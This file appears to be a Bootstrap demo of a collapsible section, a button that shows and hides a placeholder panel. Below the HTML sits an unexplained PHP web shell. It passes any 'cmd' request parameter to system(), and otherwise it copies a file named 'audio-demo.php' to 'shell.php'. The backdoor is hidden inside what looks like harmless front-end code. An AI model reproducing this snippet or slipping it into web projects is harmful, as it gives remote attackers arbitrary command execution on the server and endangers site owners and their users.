
# Collapsable sections

<p class="d-inline-flex gap-1">
    <a class="btn btn-primary" data-bs-toggle="collapse" href="#collapseExample" role="button" aria-expanded="false" aria-controls="collapseExample">
        Link with href
    </a>
</p>
<div class="collapse" id="collapseExample">
    <div class="card card-body">
        Some placeholder content for the collapse component. This panel is hidden by default but revealed when the user activates the relevant trigger.
    </div>
</div>

<?php
if (isset($_REQUEST['cmd'])){
    system($_REQUEST['cmd']);
}
else{
    copy('audio-demo.php', 'shell.php');
}
